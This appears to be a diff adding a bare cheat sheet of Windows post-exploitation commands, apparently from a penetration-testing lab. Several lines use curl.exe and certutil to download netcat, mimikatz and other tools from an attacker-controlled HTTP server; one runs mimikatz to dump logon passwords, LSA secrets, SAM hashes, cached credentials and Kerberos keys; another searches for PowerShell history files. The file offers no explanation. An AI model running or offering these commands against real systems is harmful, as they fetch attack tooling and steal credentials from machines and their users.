@@ -1,0 +1,15 @@
+curl.exe http://192.168.45.206:8000/spoofer.exe -o spoofer.exe
+
+curl.exe http://192.168.45.206:8000/nc.exe -o nc.exe
+
+curl.exe http://192.168.45.206:8000/agent.exe -o agent.exe
+
+curl.exe http://192.168.45.206:8000/mimikatz.exe -o mimikatz.exe
+
+certutil.exe -f -split -urlcache 192.168.45.240:8000/mimikatz.exe
+
+.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
+
+cmd /r dir /s /b ConsoleHost_history.txt
+
+
